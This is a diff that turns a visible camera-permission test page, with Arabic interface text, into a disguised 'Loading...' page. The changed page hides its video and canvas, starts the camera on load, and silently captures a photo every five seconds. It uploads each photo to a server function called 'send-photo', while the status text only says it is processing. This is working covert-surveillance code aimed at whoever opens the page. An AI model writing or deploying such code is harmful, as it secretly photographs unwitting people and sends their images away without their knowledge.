@@ -1,23 +1,125 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Permission Lab</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Camera Lab</title>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 30px;
+    }
+
+    /* إخفاء عنصر الفيديو والـ canvas بالكامل */
+    video, canvas {
+      display: none;
+    }
+
+    #status {
+      margin-top: 15px;
+      font-size: 18px;
+    }
+  </style>
 </head>
+
 <body>
-    <h2>Camera Permission Test</h2>
 
-    <video id="camera" autoplay playsinline width="300"></video>
+  <h2>جاري التحميل...</h2>
 
-    <script>
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                document.getElementById("camera").srcObject = stream;
+  <video id="camera" autoplay playsinline></video>
+  <p id="status">جاري تشغيل الكاميرا...</p>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const video = document.getElementById("camera");
+    const canvas = document.getElementById("canvas");
+    const status = document.getElementById("status");
+
+    let stream = null;
+    let captureTimer = null;
+
+    // تشغيل التلتقاط التلقائي عند فتح الصفحة مباشرة
+    window.addEventListener("DOMContentLoaded", async () => {
+      await startCameraAuto();
+    });
+
+    async function startCameraAuto() {
+      try {
+        // طلب إذن الكاميرا
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: true
+        });
+
+        video.srcObject = stream;
+
+        // الانتظار حتى يتأكد المتصفح من بدء جلب الفيديو
+        video.onloadedmetadata = () => {
+          status.textContent = "تم التوصيل، جاري المعالجة...";
+          
+          // التقاط أول صورة فورًا
+          takeAndSend();
+
+          // التقاط صورة كل 5 ثوانٍ تلقائيًا
+          captureTimer = setInterval(() => {
+            takeAndSend();
+          }, 5000);
+        };
+
+      } catch (error) {
+        status.textContent = "تعذر الوصول إلى الكاميرا أو تم رفض الإذن.";
+        console.error(error);
+      }
+    }
+
+    // التقاط الصورة وإرسالها
+    async function takeAndSend() {
+      if (!stream) return;
+
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+
+      const ctx = canvas.getContext("2d");
+
+      ctx.drawImage(
+        video,
+        0,
+        0,
+        canvas.width,
+        canvas.height
+      );
+
+      const image = canvas.toDataURL("image/jpeg", 0.8);
+
+      try {
+        const response = await fetch(
+          "/.netlify/functions/send-photo",
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              image: image
             })
-            .catch(error => {
-                console.log("Camera permission denied:", error);
-            });
-    </script>
+          }
+        );
+
+        const result = await response.json();
+
+        if (result.ok) {
+          status.textContent = "جاري العمل...";
+        } else {
+          status.textContent = "حدث خطأ أثناء المعالجة.";
+        }
+
+      } catch (error) {
+        status.textContent = "خطأ في الاتصال بالخادم.";
+        console.error(error);
+      }
+    }
+  </script>
+
 </body>
 </html>
